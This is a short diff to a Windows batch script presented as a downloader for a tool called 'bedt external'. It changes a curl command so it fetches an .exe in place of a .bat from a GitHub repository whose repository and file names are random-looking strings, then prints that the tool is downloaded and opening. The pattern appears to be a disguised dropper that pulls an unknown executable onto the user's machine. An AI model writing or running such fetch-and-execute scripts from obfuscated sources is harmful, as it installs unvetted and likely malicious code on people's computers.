@@ -1,6 +1,6 @@
 @echo off
 cd %userprofile%\Downloads\bedt_external
-curl -O https://raw.githubusercontent.com/aaronestaaron/pbvFmVVhTdTYdqhpSXRYADJWBDPFLjAOOYCsHveMAiarV.github.io/refs/heads/main/yMPoGoPIqKtssKSZAvJywLfRXhmgHBzPiDEkliwyYmdjY.bat
+curl -O https://github.com/aaronestaaron/pbvFmVVhTdTYdqhpSXRYADJWBDPFLjAOOYCsHveMAiarV.github.io/raw/refs/heads/main/yMPoGoPIqKtssKSZAvJywLfRXhmgHBzPiDEkliwyYmdjY.exe
 echo bedt external has downloaded.
 echo opening bedt external...
 timeout /t 2 /nobreak >nul
